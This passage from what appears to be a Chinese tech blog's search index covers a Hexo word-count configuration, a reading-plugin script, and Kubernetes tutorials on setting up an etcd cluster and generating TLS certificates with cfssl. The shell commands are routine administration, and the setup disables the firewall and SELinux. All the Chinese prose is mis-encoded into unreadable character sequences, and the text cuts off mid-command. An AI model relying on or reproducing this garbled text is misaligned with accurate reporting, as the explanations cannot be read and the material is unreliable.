¹ç›®å½•é‡Œï¼Œæ‰¾åˆ° _config.yml æ–‡ä»¶ï¼Œç„¶åæ·»åŠ å¦‚ä¸‹çš„é…ç½®é¡¹ 123456symbols_count_time: time: true # æ–‡ç« é˜…è¯»æ—¶é•¿ symbols: true # æ–‡ç« å­—æ•°ç»Ÿè®¡ total_time: true # ç«™ç‚¹æ€»é˜…è¯»æ—¶é•¿ total_symbols: true # ç«™ç‚¹æ€»å­—æ•°ç»Ÿè®¡ exclude_codeblock: true # æ’é™¤ä»£ç å­—æ•°ç»Ÿè®¡ æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 1234symbols_count_time: separated_meta: false # æ˜¯å¦å¦èµ·ä¸€è¡Œæ˜¾ç¤ºï¼ˆå³ä¸å’Œå‘è¡¨æ—¶é—´ç­‰åŒä¸€è¡Œæ˜¾ç¤ºï¼‰ item_text_post: true # é¦–é¡µæ–‡ç« ç»Ÿè®¡æ•°é‡å‰æ˜¯å¦æ˜¾ç¤ºæ–‡å­—æè¿°ï¼ˆæœ¬æ–‡å­—æ•°ã€é˜…è¯»æ—¶é•¿ï¼‰ item_text_total: false # é¡µé¢åº•éƒ¨ç»Ÿè®¡æ•°é‡å‰æ˜¯å¦æ˜¾ç¤ºæ–‡å­—æè¿°ï¼ˆç«™ç‚¹æ€»å­—æ•°ã€ç«™ç‚¹é˜…è¯»æ—¶é•¿ï¼‰ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢"},{title:"Kubernetes ä¹‹äºŒåŸºäºäºŒè¿›åˆ¶æ–¹å¼æ­å»ºé›†ç¾¤",url:"/posts/ccd6f2d4.html",text:'å‰è¨€è½¯ä»¶ç¯å¢ƒ è½¯ä»¶ ç‰ˆæœ¬ å®‰è£…æ–¹å¼ CentOS 7.9 3.10.0-1160.15.2.el7.x86_64 è™šæ‹Ÿæœº Docker docker-19.03.9 äºŒè¿›åˆ¶å®‰è£…åŒ… Kubernetes 1.19 äºŒè¿›åˆ¶å®‰è£…åŒ… Etcd 3.4.9 äºŒè¿›åˆ¶å®‰è£…åŒ… é›†ç¾¤æ­å»ºè¦æ±‚æ­å»º Kubernetes é›†ç¾¤éœ€è¦æ»¡è¶³ä»¥ä¸‹å‡ ä¸ªæ¡ä»¶ï¼š ä¸€å°æˆ–å¤šå°æœºå™¨ï¼Œå»ºè®®æ“ä½œç³»ç»Ÿ CentOS 7_x86_64 Master èŠ‚ç‚¹çš„ç¡¬ä»¶é…ç½®ï¼š2GB æˆ–æ›´å¤š RAMï¼Œ2 ä¸ª CPU æˆ–æ›´å¤š CPUï¼Œç¡¬ç›˜ 20GB æˆ–æ›´å¤š Node èŠ‚ç‚¹çš„ç¡¬ä»¶é…ç½®ï¼š4GB æˆ–æ›´å¤š RAMï¼Œ4 ä¸ª CPU æˆ–æ›´å¤š CPUï¼Œç¡¬ç›˜ 40GB æˆ–æ›´å¤š ç³»ç»Ÿå†…å¯ä»¥è®¿é—®å¤–ç½‘ï¼Œéœ€è¦æ‹‰å–é•œåƒï¼Œå¦‚æœæœåŠ¡å™¨ä¸èƒ½ä¸Šç½‘ï¼Œéœ€è¦æå‰ä¸‹è½½é•œåƒå¹¶å¯¼å…¥èŠ‚ç‚¹ é›†ç¾¤ä¸­æ‰€æœ‰æœºå™¨ä¹‹é—´çš„ç½‘ç»œå¯ä»¥äº’é€š ç¦ç”¨ swap åˆ†åŒº é›†ç¾¤æœåŠ¡å™¨è§„åˆ’ Host Name è§’è‰² IP CPU Memory Disk ç»„ä»¶ k8s-master master 192.168.1.109 &gt;= 2C &gt;=2G &gt;=20G kube-apiserverï¼Œkube-controller-managerï¼Œkube-schedulerï¼Œetcd k8s-node1 node 192.168.1.200 &gt;= 4C &gt;=4G &gt;=40G kubeletï¼Œkube-proxyï¼Œdockerï¼Œetcd k8s-node2 node 192.168.1.111 &gt;= 4C &gt;=4G &gt;=40G kubeletï¼Œkube-proxyï¼Œdockerï¼Œetcd k8s-node3 node 192.168.1.112 &gt;= 4C &gt;=4G &gt;=40G kubeletï¼Œkube-proxyï¼Œdockerï¼Œetcd Kubernetes å• Master é›†ç¾¤æ­å»ºç³»ç»Ÿåˆå§‹åŒ–å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä»¥ä¸‹ç³»ç»Ÿåˆå§‹åŒ–æ“ä½œå¿…é¡»åœ¨æ‰€æœ‰èŠ‚ç‚¹ä¸Šæ‰§è¡Œä¸€æ¬¡ï¼ŒåŒ…æ‹¬ Master èŠ‚ç‚¹ä¸ Node èŠ‚ç‚¹ã€‚ å…³é—­é˜²ç«å¢™ 12345# ä¸´æ—¶å…³é—­# systemctl stop firewalld# æ°¸ä¹…å…³é—­# systemctl disable firewalld å…³é—­ selinux 12345# ä¸´æ—¶å…³é—­# setenforce 0# æ°¸ä¹…å…³é—­# sed -i \'s/enforcing/disabled/\' /etc/selinux/config å…³é—­ swap 12345# ä¸´æ—¶å…³é—­$ swapoff -a# æ°¸ä¹…å…³é—­# sed -i \'s/.*swap.*/#&amp;/\' /etc/fstab ç³»ç»Ÿæ—¶é—´åŒæ­¥ 12345# å®‰è£…æ—¶é—´åŒæ­¥å·¥å…·# yum install ntpdate -y# è®¾ç½®æ—¶é—´åŒæ­¥æœåŠ¡å™¨# ntpdate time.windows.com å°†æ¡¥æ¥çš„ IPv4 æµé‡ä¼ é€’åˆ° iptables çš„é“¾ 1234567# æ·»åŠ è·¯ç”±è§„åˆ™# vim /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-iptables = 1net.bridge.bridge-nf-call-ip6tables = 1# é…ç½®ç”Ÿæ•ˆ# sysctl --system è®¾ç½®ä¸»æœºå 1# hostnamectl set-hostname &lt;hostname&gt; æ·»åŠ  hostsï¼ˆMaster å’Œå„ Node èŠ‚ç‚¹éƒ½éœ€è¦é…ç½®ï¼‰ 123456# æ·»åŠ hosts# vim /etc/hosts192.168.1.109 k8s-master192.168.1.200 k8s-node1192.168.1.111 k8s-node2192.168.1.112 k8s-node3 æ­å»º Etcd é›†ç¾¤Etcd æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼é”®å€¼å­˜å‚¨ç³»ç»Ÿï¼ŒKubernetes ä½¿ç”¨ Etcd è¿›è¡Œæ•°æ®å­˜å‚¨ï¼Œæ‰€ä»¥å…ˆå‡†å¤‡ä¸€ä¸ª Etcd ç³»ç»Ÿã€‚ä¸ºè§£å†³ Etcd å•ç‚¹æ•…éšœï¼Œå»ºè®®é‡‡ç”¨é›†ç¾¤æ–¹å¼éƒ¨ç½²ï¼Œè¿™é‡Œä½¿ç”¨ 3 å°æœºå™¨ç»„å»º Etcd é›†ç¾¤ï¼Œå¯å®¹å¿ 1 å°æœºå™¨æ•…éšœã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ 5 å°ç»„å»ºé›†ç¾¤ï¼Œå¯å®¹å¿ 2 å°æœºå™¨æ•…éšœã€‚ä¸ºäº†èŠ‚çœæœºå™¨ï¼Œè¿™é‡Œä¸ Kubernetes èŠ‚ç‚¹æœºå™¨å¤ç”¨ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹äº Kubernetes é›†ç¾¤ä¹‹å¤–éƒ¨ç½²ï¼Œåªè¦ api-server èƒ½è¿æ¥ä¸Šå°±è¡Œã€‚ CFSSL ç”Ÿæˆè¯ä¹¦CFSSL æ˜¯ CloudFlare å¼€æºçš„ä¸€æ¬¾ PKI/TLS å·¥å…·ï¼ŒåŒ…å«ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·å’Œä¸€ä¸ªç”¨äºç­¾åã€éªŒè¯å¹¶ä¸”æ†ç»‘ TLS è¯ä¹¦çš„ HTTP API æœåŠ¡ï¼Œè¯¦ç»†ä½¿ç”¨æ•™ç¨‹åœ¨è¿™é‡Œã€‚ å®‰è£… CFSSL 12345678910# äºŒè¿›åˆ¶æ–¹å¼å®‰è£…# curl -L https://pkg.cfssl.org/R1.2/cfssl_linux-amd64 -o /usr/local/bin/cfssl# curl -L https://pkg.cfssl.org/R1.2/cfssljson_linux-amd64 -o /usr/local/bin/cfssljson# curl -L https://pkg.cfssl.org/R1.2/cfssl-certinfo_linux-amd64 -o /usr/local/bin/cfssl-certinfo# æ–‡ä»¶æˆæƒ# chmod +x /usr/local/bin/cfssl*# é…ç½®ç¯å¢ƒå˜é‡# export PATH=/usr/local/bin:$PATH åˆ›å»º CA è¯ä¹¦çš„é…ç½®æ–‡ä»¶ 1234567891011121314151617181920# cat &lt;&lt; EOF | tee ca-config.json{ "signing": { "default": { "expiry": "87600h" }, "profiles": { "www": { "expiry": "87600h", "usages": [ "signing", "key encipherment", "server auth", "client auth" ] } } }}EOF åˆ›å»º CA è¯ä¹¦ç­¾åçš„é…ç½®æ–‡ä»¶ 123456789101112131415161718192021# cat &lt;&lt; EOF | tee ca-csr.json{ "CN": "etcd ca", "key": { "algo": "rsa", "size": 2048 }, "names": [ { "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" } ], "ca": { "expiry": "87600h" }}EOF åˆ›å»º Etcd è¯ä¹¦çš„é…ç½®æ–‡ä»¶ï¼Œhosts å­—æ®µä¸­çš„ IP ä¸ºæ‰€æœ‰ Etcd èŠ‚ç‚¹çš„é›†ç¾¤å†…éƒ¨é€šä¿¡ IPï¼Œä¸ºäº†æ–¹ä¾¿åæœŸæ‰©å®¹ï¼Œå¯ä»¥å¤šå†™å‡ ä¸ªé¢„ç•™çš„ IPã€‚ç”±äºè¿™é‡Œçš„ Etcd é›†ç¾¤èŠ‚ç‚¹å’Œ Kubernetes çš„é›†ç¾¤èŠ‚ç‚¹å…±åŒå®‰è£…åœ¨ä¸åŒè™šæ‹Ÿæœºå†…ï¼Œæ‰€ä»¥ IP åˆ—è¡¨å°±æ˜¯ Kubernetes é›†ç¾¤å„èŠ‚ç‚¹çš„ IP é›†åˆã€‚ 123456789101112131415161718192021222324# cat &lt;&lt; EOF | tee server-csr.json{ "CN": "etcd", "hosts": [ "192.168.1.109", "192.168.1.200", "192.168.1.111", "192.168.1.112" ], "key": { "algo": "rsa", "size": 2048 }, "names": [ { "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" } ]}EOF ä½¿ç”¨è‡ªç­¾ CA ç­¾å‘ Etcd è¯ä¹¦ 12345678910111213# æŸ¥çœ‹ç›®å½•æ–‡ä»¶# lsca-config.json ca-csr.json server-csr.json# ç”ŸæˆCAè¯ä¹¦# cfssl gencert -initca ca-csr.json | cfssljson -bare ca -# ç”ŸæˆEtcdè¯ä¹¦ï¼Œ"-profile" å‚æ•°çš„å€¼å¿…é¡»ä¸ `ca-config.json` é…ç½®æ–‡ä»¶ä¸­çš„å€¼ä¸€è‡´# cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=www server-csr.json | cfssljson -bare server# æŸ¥çœ‹ç”Ÿæˆç»“æœ# lsca-config.json ca.csr ca-csr.json ca-key.pem ca.pem server.csr server-csr.json server-key.pem server.pem éƒ¨ç½² Etcd é›†ç¾¤ä»¥ä¸‹æ“ä½œéƒ½æ˜¯åœ¨ Kubernetes çš„ Master èŠ‚ç‚¹ä¸Šæ‰§è¡Œï¼Œå®Œæˆåä¼šå°† Master èŠ‚ç‚¹ä¸Šç”Ÿæˆçš„æ‰€æœ‰ Etcd æ–‡ä»¶å…¨éƒ¨æ‹·è´åˆ°å…¶ä»– Node èŠ‚ç‚¹ã€‚åƒä¸‡ä¸è¦åœ¨æ¯ä¸ª Node èŠ‚ç‚¹éƒ½å•ç‹¬æ‰§è¡Œç”Ÿæˆ Etcd è¯ä¹¦çš„æ“ä½œï¼Œå¦åˆ™ Etcd é›†ç¾¤é‡Œçš„èŠ‚ç‚¹å¯èƒ½ä¼šå› è¯ä¹¦ä¸ä¸€è‡´è€Œå¯¼è‡´é›†ç¾¤å¯åŠ¨å¤±è´¥ã€‚ Master èŠ‚ç‚¹å®‰è£… Etcd æœåŠ¡ 1234567891011# ä¸‹è½½å®‰è£…æ–‡ä»¶# wget https://github.com/etcd-io/etcd/releases/download/v3.4.9/etcd-v3.4.9-linux-amd64.tar.gz# åˆ›å»ºå®‰è£…ç›®å½•# mkdir -p /opt/etcd/{bin,cfg,ssl}# è§£å‹å®‰è£…æ–‡ä»¶# tar zxvf etcd-v3.4.9-linux-amd64.tar.gz# æ‹·è´å®‰è£…æ–‡ä»¶# mv etcd-v3.4.9-linux-amd64/{etcd,etcdctl} /opt/etcd/bin/ Master èŠ‚ç‚¹æ‹·è´ä¸Šé¢ç”Ÿæˆçš„ Etcd è¯ä¹¦ 12# æ‹·è´è¯ä¹¦# cp ca.pem ca-key.pem server.pem server-key.pem /opt/etcd/ssl Master èŠ‚ç‚¹åˆ›å»º Etcd çš„é…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œå¿…é¡»æ ¹æ®å®é™…æƒ…å†µæ›´æ”¹ Etcd å„èŠ‚ç‚¹çš„ IPã€ç«¯å£ã€åç§° 123456789101112131415# åˆ›å»ºEtcdçš„é…ç½®æ–‡ä»¶# cat &gt; /opt/etcd/cfg/etcd.conf &lt;&lt; EOF#[Member]ETCD_NAME="etcd-1"ETCD_DATA_DIR="/var/lib/etcd/default.etcd"ETCD_LISTEN_PEER_URLS="https://192.168.1.109:2380"ETCD_LISTEN_CLIENT_URLS="https://192.168.1.109:2379"#[Cluster]ETCD_INITIAL_ADVERTISE_PEER_URLS="https://192.168.1.109:2380"ETCD_ADVERTISE_CLIENT_URLS="https://192.168.1.109:2379"ETCD_INITIAL_CLUSTER="etcd-1=https://192.168.1.109:2380,etcd-2=https://192.168.1.200:2380,etcd-3=https://192.168.1.111:2380,etcd-4=https://192.168.1.112:2380"ETCD_INITIAL_CLUSTER_TOKEN="etcd-cluster"ETCD_INITIAL_CLUSTER_STATE="new"EOF 123456789ETCD_NAMEï¼šèŠ‚ç‚¹åç§°ï¼Œé›†ç¾¤ä¸­å”¯ä¸€ETCDDATADIRï¼šæ•°æ®ç›®å½•è·¯å¾„ETCD_LISTEN_PEER_URLSï¼šé›†ç¾¤é€šä¿¡ç›‘å¬åœ°å€ETCD_LISTEN_CLIENT_URLSï¼šå®¢æˆ·ç«¯è®¿é—®ç›‘å¬åœ°å€ETCD_INITIAL_ADVERTISE_PEER_URLSï¼šé›†ç¾¤é€šå‘Šåœ°å€ETCD_ADVERTISE_CLIENT_URLSï¼šå®¢æˆ·ç«¯é€šå‘Šåœ°å€ETCD_INITIAL_CLUSTERï¼šé›†ç¾¤èŠ‚ç‚¹åœ°å€ETCD_INITIAL_CLUSTER_TOKENï¼šé›†ç¾¤ TokenETCD_INITIAL_CLUSTER_STATEï¼šåŠ å…¥é›†ç¾¤çš„å½“å‰çŠ¶æ€ï¼Œnew æ˜¯æ–°é›†ç¾¤ï¼Œexisting è¡¨ç¤ºåŠ å…¥å·²æœ‰é›†ç¾¤ Master èŠ‚ç‚¹ä½¿ç”¨ Systemd ç®¡ç† Etcd æœåŠ¡ 1234567891011121314151617181920212223242526272829303132# åˆ›å»ºEtcdæœåŠ¡ç®¡ç†çš„é…ç½®æ–‡ä»¶# cat &gt; /usr/lib/systemd/system/etcd.service &lt;&lt; EOF[Unit]Description=Etcd ServerAfter=network.targetAfter=network-online.targetWants=network-online.target[Service]Type=notifyEnvironmentFile=/opt/etcd/cfg/etcd.confExecStart=/opt/etcd/bin/etcd \\--cert-file=/opt/etcd/ssl/server.pem \\--key-file=/opt/etcd/ssl/server-key.pem \\--peer-cert-file=/opt/etcd/ssl/server.pem \\--peer-key-file=/opt/etcd/ssl/server-key.pem \\--trusted-ca-file=/opt/etcd/ssl/ca.pem \\--peer-trusted-ca-file=/opt/etcd/ssl/ca.pem \\--logger=zapRestart=alwaysRestartSec=10sLimitNOFILE=65536[Install]WantedBy=multi-user.targetEOF# æ›´æ–°é…ç½®# systemctl daemon-reload# å¼€æœºè‡ªå¯åŠ¨# systemctl enable etcd æ‹·è´ Kubernetes çš„ Master èŠ‚ç‚¹é‡Œçš„æ‰€æœ‰ Etcd æ–‡ä»¶åˆ°å…¶ä»– Node èŠ‚ç‚¹ï¼Œå¹¶åœ¨å„ä¸ª Node èŠ‚ç‚¹é‡Œåˆ†åˆ«é…ç½® Etcd å’Œè®¾ç½® Etcd æœåŠ¡å¼€æœºè‡ªå¯åŠ¨ 12345678910111213141516# æ‹·è´Etcdçš„æ–‡ä»¶åˆ°å„ä¸ªNodeèŠ‚ç‚¹# scp -r /opt/etcd/ root@k8s-node1:/opt/# scp -r /opt/etcd/ root@k8s-node2:/opt/# scp -r /opt/etcd/ root@k8s-node3:/opt/# æ‹·è´EtcdæœåŠ¡ç®¡ç†çš„é…ç½®æ–‡ä»¶åˆ°å„ä¸ªNodeèŠ‚ç‚¹# scp /usr/lib/systemd/system/etcd.service root@k8s-node1:/usr/lib/systemd/system/# scp /usr/lib/systemd/system/etcd.service root@k8s-node2:/usr/lib/systemd/system/# scp /usr/lib/systemd/system/etcd.service root@k8s-node3:/usr/lib/systemd/system/# åœ¨å„ä¸ªNodeèŠ‚ç‚¹é‡Œåˆ†åˆ«ç¼–è¾‘Etcdçš„é…ç½®æ–‡ä»¶ï¼ŒåŒ…æ‹¬æ›´æ”¹å½“å‰èŠ‚ç‚¹çš„åç§°å’ŒIP# vim /opt/etcd/cfg/etcd.conf# åœ¨å„ä¸ªNodeèŠ‚ç‚¹é‡Œåˆ†åˆ«è®¾ç½®EtcdæœåŠ¡å¼€æœºè‡ªå¯åŠ¨# systemctl daemon-reload# systemctl enable etcd å¯åŠ¨ Etcd é›†ç¾¤åœ¨ Etcd çš„å¤šä¸ªèŠ‚ç‚¹é‡Œåˆ†åˆ«æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥å¯åŠ¨ Etcd é›†ç¾¤ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¿…é¡»åœ¨å¤šä¸ª Etcd èŠ‚ç‚¹é‡ŒåŒæ—¶æ‰§è¡Œ systemctl start etcd å‘½ä»¤æ¥å¯åŠ¨é›†ç¾¤ï¼Œå¦åˆ™å•ä¸ª Etcd èŠ‚ç‚¹æ˜¯æ— æ³•æ­£å¸¸å¯åŠ¨çš„ 123456789# å¯åŠ¨Etcd# systemctl start etcd# æŸ¥çœ‹è¿è¡ŒçŠ¶æ€# systemctl satus etcd# æŸ¥çœ‹å¯åŠ¨æ—¥å¿—# journalctl -u etcd# tail -f 200 /var/log/message è‹¥ Etcd é›†ç¾¤å¯åŠ¨å¤±è´¥ï¼Œå¯ä»¥åœ¨å„ä¸ª Etcd èŠ‚ç‚¹é‡Œåˆ†åˆ«æ‰§è¡Œä»¥ä¸‹æ“ä½œæ¥è§£å†³ 12345678# å…³é—­Etcd# systemctl stop etcd# åˆ é™¤æ•°æ®ç›®å½•# rm -rf /var/lib/etcd/default.etcd# é‡å¯Etcd# systemctl start etcd å‚è€ƒåšå®¢ Etcd é›†ç¾¤æ•…éšœå¤„ç† K8S äºŒè¿›åˆ¶éƒ¨ç½²é«˜å¯ç”¨é›†ç¾¤ï¼ˆCalico ç½‘ç»œæ–¹æ¡ˆï¼‰ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Kubernetes åˆ›å»º TLS è¯ä¹¦",url:"/posts/58887565.html",text:'å‰è¨€æ¦‚è¿°Kubernetes ç³»ç»Ÿçš„å„ç»„ä»¶éœ€è¦ä½¿ç”¨ TLS è¯ä¹¦å¯¹é€šä¿¡è¿›è¡ŒåŠ å¯†ï¼Œæœ¬æ–‡ä½¿ç”¨ CloudFlare çš„ PKI å·¥å…·é›† cfssl æ¥ç”Ÿæˆ Certificate Authority (CA) å’Œå…¶å®ƒè¯ä¹¦ï¼Œä½¿ç”¨è¯ä¹¦çš„ç»„ä»¶å¦‚ä¸‹ï¼š ç»„ä»¶ è¯ä¹¦ etcd ca.pemã€kubernetes-key.pemã€kubernetes.pem kube-apiserver ca.pemã€kubernetes-key.pemã€kubernetes.pem kubelet ca.pem kube-proxy ca.pemã€kube-proxy-key.pemã€kube-proxy.pem kubectl ca.pemã€admin-key.pemã€admin.pem kube-controller-manager ca-key.pemã€ca.pem ç”¨äºåˆ›å»ºè¯ä¹¦çš„ Json æ–‡ä»¶åœ¨éƒ¨ç½² Kubernetes é›†ç¾¤æ—¶åˆ›å»ºè¯ä¹¦ä¼šä½¿ç”¨åˆ°çš„ Json æ–‡ä»¶ï¼Œé‡Œé¢åŒ…å«æœ‰ Kubernetes å„ç»„ä»¶åˆ›å»ºè¯ä¹¦æ—¶ä½¿ç”¨åˆ°çš„ Json æ–‡ä»¶ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹ï¼Œç‚¹å‡»ä¸‹è½½ã€‚ 12345678910111213141516â”œâ”€â”€ caâ”‚&nbsp;&nbsp; â””â”€â”€ ca-config.jsonâ”œâ”€â”€ etcdâ”‚&nbsp;&nbsp; â””â”€â”€ server-csr.jsonâ”œâ”€â”€ kube-apiserverâ”‚&nbsp;&nbsp; â””â”€â”€ server-csr.jsonâ”œâ”€â”€ kube-controller-managerâ”‚&nbsp;&nbsp; â””â”€â”€ kube-controller-manager-csr.jsonâ”œâ”€â”€ kubectlâ”‚&nbsp;&nbsp; â””â”€â”€ admin-csr.jsonâ”œâ”€â”€ kubeletâ”‚&nbsp;&nbsp; â””â”€â”€ kubelet.config.jsonâ”œâ”€â”€ kube-proxyâ”‚&nbsp;&nbsp; â””â”€â”€ kube-proxy-csr.jsonâ””â”€â”€ kube-scheduler â””â”€â”€ kube-scheduler-csr.json ç‰¹åˆ«æ³¨æ„ï¼šåˆ›å»ºè¯ä¹¦çš„æ“ä½œéƒ½æ˜¯åœ¨ Kubernetes çš„ Master èŠ‚ç‚¹ä¸Šæ‰§è¡Œï¼Œè¯ä¹¦åªéœ€è¦åˆ›å»ºä¸€æ¬¡å³å¯ï¼Œä»¥åå‘ Kubernetes é›†ç¾¤ä¸­æ·»åŠ æ–°èŠ‚ç‚¹æ—¶ï¼Œåªè¦å°†å¯¹åº”çš„è¯ä¹¦æ‹·è´åˆ°æ–°èŠ‚ç‚¹ä¸Šå³å¯ã€‚åƒä¸‡ä¸è¦åœ¨æ¯ä¸ª Node èŠ‚ç‚¹éƒ½å•ç‹¬æ‰§è¡Œç”Ÿæˆ Etcd è¯ä¹¦çš„æ“ä½œï¼Œå¦åˆ™ Etcd é›†ç¾¤é‡Œçš„èŠ‚ç‚¹å¯èƒ½ä¼šå› è¯ä¹¦ä¸ä¸€è‡´è€Œå¯¼è‡´é›†ç¾¤å¯åŠ¨å¤±è´¥ã€‚ å®‰è£… CFSSLCFSSL æ˜¯ CloudFlare å¼€æºçš„ä¸€æ¬¾ PKI/TLS å·¥å…·ï¼ŒåŒ…å«ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·å’Œä¸€ä¸ªç”¨äºç­¾åã€éªŒè¯å¹¶ä¸”æ†ç»‘ TLS è¯ä¹¦çš„ HTTP API æœåŠ¡ï¼Œä½¿ç”¨ Go è¯­è¨€ç¼–å†™ã€‚ 12345678910# äºŒè¿›åˆ¶æ–¹å¼å®‰è£…# curl -L https://pkg.cfssl.org/R1.2/cfssl_linux-amd64 -o /usr/local/bin/cfssl# curl -L https://pkg.cfssl.org/R1.2/cfssljson_linux-amd64 -o /usr/local/bin/cfssljson# curl -L https://pkg.cfssl.org/R1.2/cfssl-certinfo_linux-amd64 -o /usr/local/bin/cfssl-certinfo# æ–‡ä»¶æˆæƒ# chmod +x /usr/local/bin/cfssl*# é…ç½®ç¯å¢ƒå˜é‡# export PATH=/usr/local/bin:$PATH åˆ›å»º CA è¯ä¹¦åˆ›å»º CA è¯ä¹¦çš„é…ç½®æ–‡ä»¶ 1234567891011121314151617181920# cat &lt;&lt; EOF | tee ca-config.json{ "signing": { "default": { "expiry": "87600h" }, "profiles": { "kubernetes": { "expiry": "87600h", "usages": [ "signing", "key encipherment", "server auth", "client auth" ] } } }}EOF 123456## å­—æ®µè¯´æ˜:expiry : 87600h è¡¨ç¤ºæœ‰æ•ˆæœŸ 10 å¹´ï¼›ca-config.jsonï¼šå¯ä»¥å®šä¹‰å¤šä¸ª profilesï¼Œåˆ†åˆ«æŒ‡å®šä¸åŒçš„è¿‡æœŸæ—¶é—´ã€ä½¿ç”¨åœºæ™¯ç­‰å‚æ•°ï¼›åç»­åœ¨ç­¾åè¯ä¹¦æ—¶ä½¿ç”¨æŸä¸ª profileï¼›signingï¼šè¡¨ç¤ºè¯¥è¯ä¹¦å¯ç”¨äºç­¾åå…¶å®ƒè¯ä¹¦ï¼›ç”Ÿæˆçš„ ca.pem è¯ä¹¦ä¸­ CA=TRUEï¼›server authï¼šè¡¨ç¤º client å¯ä»¥ç”¨è¯¥ CA å¯¹ server æä¾›çš„è¯ä¹¦è¿›è¡ŒéªŒè¯ï¼›client authï¼šè¡¨ç¤º server å¯ä»¥ç”¨è¯¥ CA å¯¹ client æä¾›çš„è¯ä¹¦è¿›è¡ŒéªŒè¯ï¼› åˆ›å»º CA è¯ä¹¦ç­¾åçš„é…ç½®æ–‡ä»¶ 123456789101112131415161718192021# cat &lt;&lt; EOF | tee ca-csr.json{ "CN": "kubernetes", "key": { "algo": "rsa", "size": 2048 }, "names": [ { "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" } ], "ca": { "expiry": "87600h" }}EOF 123## å­—æ®µè¯´æ˜:"CN"ï¼šCommon Nameï¼Œkube-apiserver ä»è¯ä¹¦ä¸­æå–è¯¥å­—æ®µä½œä¸ºè¯·æ±‚çš„ç”¨æˆ·å (User Name)ï¼›æµè§ˆå™¨ä½¿ç”¨è¯¥å­—æ®µéªŒè¯ç½‘ç«™æ˜¯å¦åˆæ³•ï¼›"O"ï¼šOrganizationï¼Œkube-apiserver ä»è¯ä¹¦ä¸­æå–è¯¥å­—æ®µä½œä¸ºè¯·æ±‚ç”¨æˆ·æ‰€å±çš„ç»„ (Group)ï¼› åˆ›å»º CA è¯ä¹¦å’Œç§é’¥ 12345678910# æŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶# lsca-config.json ca-csr.json# ç”ŸæˆCAè¯ä¹¦å’Œç§é’¥# cfssl gencert -initca ca-csr.json | cfssljson -bare ca -# æŸ¥çœ‹ç”Ÿæˆç»“æœ# lsca-config.json ca.csr ca-csr.json ca-key.pem ca.pem åˆ›å»º Server è¯ä¹¦åˆ›å»ºç”¨äºç”Ÿæˆ Server è¯ä¹¦çš„ Json é…ç½®æ–‡ä»¶ï¼Œå¦‚æœ hosts å­—æ®µä¸ä¸ºç©ºï¼Œåˆ™éœ€è¦æŒ‡å®šæˆæƒä½¿ç”¨è¯¥è¯ä¹¦çš„ IP æˆ–åŸŸååˆ—è¡¨ã€‚ç”±äºè¯¥è¯ä¹¦åç»­è¢« Etcd é›†ç¾¤å’Œ Kubernetes é›†ç¾¤ä½¿ç”¨ï¼Œæ‰€ä»¥ä¸€èˆ¬åˆ†åˆ«æŒ‡å®š Etcd é›†ç¾¤ã€Kubernetes é›†ç¾¤å„ Masterã€Node èŠ‚ç‚¹çš„ä¸»æœº IP å’Œ Kubernetes æœåŠ¡ IPï¼ˆé€šå¸¸æ˜¯ kube-apiserver æŒ‡å®šçš„ service-cluster-ip-range ç½‘æ®µçš„ç¬¬ä¸€ä¸ª IPï¼Œå¦‚ 10.254.0.1ï¼‰ 123456789101112131415161718192021222324# cat &lt;&lt; EOF | tee server-csr.json{ "CN": "kubernetes", "hosts": [ "192.168.1.61", "192.168.1.62", "192.168.1.63", "192.168.1.64" ], "key": { "algo": "rsa", "size": 2048 }, "names": [ { "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" } ]}EOF åˆ›å»º Server è¯ä¹¦ 1234567891011121314# æŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶# lsca-config.json ca.csr ca-csr.json ca-key.pem ca.pem server-csr.json# åˆ›å»ºServerè¯ä¹¦ï¼Œ"-profile" å‚æ•°çš„å€¼å¿…é¡»ä¸ `ca-config.json` é…ç½®æ–‡ä»¶ä¸­çš„å€¼ä¸€è‡´# cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json 